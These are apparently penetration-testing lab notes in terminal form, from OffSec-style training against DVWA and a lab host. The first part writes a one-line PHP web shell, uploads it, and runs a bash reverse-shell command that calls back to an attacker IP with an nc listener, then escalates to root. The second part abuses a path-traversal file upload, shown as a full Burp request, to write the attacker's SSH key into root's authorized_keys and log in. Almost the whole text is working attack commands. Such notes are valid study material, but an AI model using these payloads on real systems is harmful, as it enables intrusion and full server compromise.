WEB SHELL:

1. Create a Web Shell (test.php)

┌──(kali㉿kali)-[~]
└─$ cat shell.php
<?php system($_GET['cmd']);?>

2. Upload the Web Shell:
http://dvwa.local/DVWA/vulnerabilities/upload/#

3. Execute code using the web shell:
┌──(kali㉿kali)-[~]
└─$ curl http://dvwa.local/DVWA/hackable/uploads/shell.php?cmd=whoami 
www-data

4. Use the Web Shell to get a Reverse Shell:
┌──(kali㉿kali)-[~]
└─$ http://dvwa.local/DVWA/hackable/uploads/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.48.128/1234%200%3E%261%27

5. Upgrade the Reverse Shell to an Interactive Shell:
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.48.128] from (UNKNOWN) [192.168.48.1] 8730
bash: cannot set terminal process group (12658): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wsl:/var/www/html/DVWA/hackable/uploads$ python3 -c 'import pty; pty.spawn("/bin/sh")' 
<oads$ python3 -c 'import pty; pty.spawn("/bin/sh")'     
$ su hacker
su hacker
root@wsl:/var/www/html/DVWA/hackable/uploads# 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SSH PUBLIC KEY:

┌──(kali㉿kali)-[~]
└─$ ssh-keygen                                       
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519):
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:eEUqIus4VBBq6VjAYdUpe9rG+zlM6y2N1bR8YUF1Ej0 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|o=+.. .   . ..++.|
|ooo. o   o   . Eo|
|.oo.+ . . .   . .|
|+..+ o o . . o   |
|.o. = . S + o .  |
|.o . + o . + .   |
|o . . + =   .    |
| .   . *o.       |
|      o+o.       |
+----[SHA256]-----+
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat id_ed25519.pub > authorized_keys

Connect to the web application:
┌──(kali㉿kali)-[~]
└─$ firefox  http://mountaindesserts.com:8000/

Set Firefox proxy settings

In Burp Suite, turn intercept on.

Click "Browse" and attach the authorized_keys file.

Click "Upload"

In Burp Suite, change the destination to the .ssh directory on the web server:
POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------169540136610505382742425946124
Content-Length: 334
Origin: http://mountaindesserts.com:8000
Connection: keep-alive
Referer: http://mountaindesserts.com:8000/
Upgrade-Insecure-Requests: 1
-----------------------------169540136610505382742425946124
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMYkdnzVCv6HAGaehXRnl1mZo9ZT9XzuhkeyZ22m1Bqa kali@kali
-----------------------------169540136610505382742425946124--

Forward the request in Burp Suite

Connect to the web server by using our private key :

┌──(kali㉿kali)-[~]
└─$ rm ~/.ssh/known_hosts

┌──(kali㉿kali)-[~/.ssh]
└─$ chmod 600 ~/.ssh/id_ed25519

┌──(kali㉿kali)-[~]
└─$ ssh -p 2222 -i id_ed25519 root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.169.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[mountaindesserts.com]:2222' (ED25519) to the list of known hosts.
Linux 6e3b0e4fe4c6 5.4.0-137-generic #154-Ubuntu SMP Thu Jan 5 17:03:22 UTC 2023 x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@6e3b0e4fe4c6:~# cat /root/flag.txt
OS{10fe65a262a422b007e1ab85cb485f24}
